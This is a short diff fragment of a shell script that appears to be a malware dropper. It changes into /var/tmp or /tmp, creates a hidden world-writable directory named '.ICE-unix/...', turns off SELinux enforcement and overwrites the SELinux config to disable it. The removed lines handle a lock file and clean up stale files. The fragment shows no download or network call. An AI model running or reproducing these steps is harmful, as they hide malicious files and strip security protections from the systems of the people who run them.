@@ -5,15 +5,6 @@ sleep 1
 cd /var/tmp || cd /tmp
 sleep 1
 [ -d .ICE-unix/... ] || mkdir -p .ICE-unix/... && chmod -R 777 .ICE-unix
-sleep 1
-cd .ICE-unix/... || exit 100
-sleep 1
-find . -maxdepth 1 -name ".m*" -type f -mmin +66 -delete
-sleep 1
-[ -f .mash* ] && exit 0 || touch .mash$$
-sleep 1
-trap "rm -rf .mash*" EXIT
-sleep 1
 setenforce 0 2>/dev/null
 sleep 1
 echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
